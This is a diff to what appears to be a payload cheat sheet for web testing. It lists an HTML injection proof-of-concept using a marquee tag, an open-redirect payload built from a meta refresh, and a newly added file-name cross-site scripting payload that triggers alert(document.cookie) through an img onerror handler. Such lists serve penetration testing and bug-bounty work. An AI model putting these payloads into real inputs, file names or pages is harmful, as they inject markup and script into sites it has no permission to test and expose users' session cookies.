@@ -1,5 +1,5 @@
 
-   <body>
+
      ***HTML Injection Payloads***
 
 1) <!DOCTYPE html> <html>     <head>       <title>HTML marquee Tag</title>    </head> 	    <body>       <marquee>HTML INJECTION POC DONE BY SHATHISH </marquee>    </body> 	 </html>
@@ -19,5 +19,7 @@
                  ***Open Redirection Payload***
 
 6) <!DOCTYPE html> <html> <meta http-equiv="refresh" content="0.9; url=http://www.google.com/">&lt;SUBSCRIBE TO OUR CHANNEL&gt; </html>
-   </body>
-
+   
+                            ***file name payloads***
+                            
+   "><img src=x onerror=alert(document.cookie);.jpg
